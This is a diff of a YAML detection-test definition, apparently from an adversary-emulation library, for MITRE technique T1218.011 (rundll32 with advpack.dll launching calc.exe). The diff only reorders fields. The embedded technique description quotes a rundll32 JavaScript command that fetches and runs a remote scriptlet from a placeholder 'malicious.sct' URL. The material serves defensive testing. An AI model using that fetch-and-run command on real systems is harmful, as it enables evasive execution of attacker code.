@@ -1,17 +1,3 @@
-guid: d91cae26-7fc1-457b-a854-34c8aad48c89
-name: Rundll32 advpack.dll Execution
-tactic:
-  - defense-evasion
-technique:
-  - T1218.011
-sigma: false
-sigma_rule: []
-os:
-  - windows
-description: |
-  Test execution of a command using rundll32.exe with advpack.dll.
-  Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
-  Upon execution calc.exe will be launched
 Attack_name: Rundll32
 Attack_description: |-
   Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.
@@ -19,3 +5,17 @@ Attack_description: |-
   Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)
 
   Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
+guid: d91cae26-7fc1-457b-a854-34c8aad48c89
+name: Rundll32 advpack.dll Execution
+tactic:
+  - defense-evasion
+technique:
+  - T1218.011
+os:
+  - windows
+description: |
+  Test execution of a command using rundll32.exe with advpack.dll.
+  Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+  Upon execution calc.exe will be launched
+sigma: false
+sigma_rule: []
